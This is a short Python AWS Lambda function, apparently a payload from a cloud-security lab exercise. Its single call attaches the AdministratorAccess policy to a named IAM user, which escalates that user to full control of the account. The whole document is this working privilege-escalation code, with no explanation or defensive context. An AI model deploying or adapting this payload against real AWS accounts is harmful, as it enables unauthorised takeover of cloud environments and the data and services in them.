import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = 'chris-cgidkrp4ywk27z', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response